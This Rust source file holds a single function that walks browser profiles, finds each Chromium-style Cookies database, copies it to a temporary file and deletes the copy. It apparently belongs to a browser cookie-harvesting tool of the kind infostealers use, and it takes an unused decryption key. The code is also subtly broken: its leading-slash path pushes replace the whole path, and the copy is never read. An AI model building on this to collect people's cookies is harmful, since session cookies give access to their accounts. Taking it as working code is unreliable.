use std::path::PathBuf;

pub(super) async fn get_cookies(
    path: &mut PathBuf,
    profiles: &Vec<String>,
    tempfile: &PathBuf,
    key: &str,
) -> std::io::Result<()> {
    for profile in profiles {
        path.push(profile);
        if cfg!(target_os = "windows") {
            path.push("/Network");
        }
        path.push("/Cookies");

        super::check_db_size(path).await?;

        // Copy the file to the temporary folder
        std::fs::copy(&path, tempfile).unwrap();

        std::fs::remove_file(tempfile).unwrap();
        path.pop();
        if cfg!(target_os = "windows") {
            path.pop();
        }
        path.pop();
    }

    Ok(())
}
